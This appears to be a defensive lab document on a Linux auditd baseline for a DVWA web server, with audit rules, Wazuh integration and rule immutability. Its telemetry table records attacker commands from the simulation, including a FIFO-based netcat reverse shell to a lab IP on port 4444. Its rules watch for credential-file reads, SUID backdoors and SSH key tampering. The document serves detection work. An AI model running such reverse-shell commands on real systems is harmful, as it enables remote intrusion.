# Linux Auditd Baseline — Endpoint Kernel Telemetry

> **Configuration & Artifacts:**
> - Production Ruleset: [`audit.rules`](audit.rules)
> - Target Deployment: DVWA Web Server / Pivot Host (`192.168.56.30`, Ubuntu 24.04 LTS)
> - Ruleset Location: `/etc/audit/rules.d/audit.rules`
> - Wazuh Ingestion: Native Wazuh Auditd ruleset (`ruleset/rules/0365-auditd_rules.xml`) + Custom `local_rules.xml`

---

## 1. Overview & Operational Role

Linux Auditd provides kernel-level system call and file-system tracking via the netlink audit subsystem. In this lab, Auditd serves as the primary endpoint detection mechanism on the Linux web server (`192.168.56.30`), capturing post-exploitation activities, reverse shell spawns, binary execution, and file staging.

---

## 2. Empirically Verified Telemetry (`key="web_process_creation"`)

Analysis of [`06-Resources/Alerts/Wazuh-Raw-Alerts.csv`](../../06-Resources/Alerts/Wazuh-Raw-Alerts.csv) confirms that the primary active rule during simulation was:

```text
-a always,exit -F arch=b64 -S execve -F uid=33 -k web_process_creation
```

This rule specifically monitors every binary execution system call (`execve`) initiated by the `www-data` service account (`uid=33`). In the raw alerts dataset, this rule generated **20 high-fidelity audit events** tracking adversary execution across Stages 05 and 06:

| Executed Binary | Working Directory | Observed Command Line / Arguments | Correlated Stage & Alert |
|---|---|---|---|
| `/usr/bin/id` | `/var/www/html/dvwa/hackable/uploads` | `id` | **Stage 05** (Web Shell: `wzb-61ed72e937`) |
| `/usr/bin/rm` | `/var/www/html/dvwa/hackable/uploads` | `rm /tmp/f` | **Stage 06** (Reverse Shell preparation) |
| `/usr/bin/cat` | `/var/www/html/dvwa/hackable/uploads` | `cat /tmp/f` | **Stage 06** (FIFO pipeline) |
| `/usr/bin/nc.openbsd` | `/var/www/html/dvwa/hackable/uploads` | `nc 192.168.232.135 4444` | **Stage 06** (Reverse Shell: `wzb-ccae331b77`) |
| `/usr/bin/python3` | `/var/www/html/dvwa/hackable/uploads` | `python3` interactive socket | **Stage 06** (Reverse Shell) |
| `/usr/bin/sed`, `/usr/bin/awk` | `/var/www/html/dvwa/hackable/uploads` | Text processing and enumeration | **Stage 06** |

---

## 3. Defense-in-Depth Rules Inventory

In addition to `web_process_creation`, [`audit.rules`](audit.rules) provides comprehensive host coverage:

| Audit Key | Monitored Action | Syscall / File Target | Defensive Purpose |
|---|---|---|---|
| `web_process_creation` | Web server command execution | `-S execve -F uid=33` | Catches web shell commands and reverse shell spawns |
| `priv_escalation` | Setuid/setgid execution | `-S setuid,setgid,setreuid,setregid` | Flags privilege level changes |
| `setuid_creation` | SUID bit modification | `-S chmod,fchmod -F a2&04000` | Detects backdoor binary creation (`chmod +s`) |
| `ssh_root_persistence` | SSH key persistence | `-w /root/.ssh -p wa` | Alerts on authorized_keys tampering (Stage 08) |
| `identity` | Account tampering | `-w /etc/passwd -p wa`, `-w /etc/shadow` | Detects unauthorized user account additions |
| `cat_sensitive_file` | Sensitive file reads | `-w /etc/passwd -p r`, `-w /etc/shadow` | Alerts on credential harvesting attempts |
| `suspicious_exec_dir` | Directory execution | `-S execve -F dir=/tmp`, `-F dir=/opt` | Detects payloads executing out of `/tmp` |

---

## 4. Rule Lock Immutability (`-e 2`)

The baseline enforces `-e 2` as the final directive in `audit.rules`. This sets the audit system to **immutable mode**:
- Rules cannot be modified, deleted, or cleared (`auditctl -D` is blocked).
- Disabling the audit daemon requires a full operating system reboot.
- Prevents root-level attackers from disabling kernel auditing during active intrusions.

---

## 5. Wazuh Integration Mechanics

Wazuh processes Auditd logs via native decoder `auditd` and maps them to built-in rules (e.g., Rule `100199`: `Auditd: blacklisted/suspicious command executed`). The `thecustomhive` integration groups sibling executions sharing untracked parent PIDs into `process_fanout` incident alerts in TheHive (e.g. `wzb-61ed72e937` and `wzb-ccae331b77`).
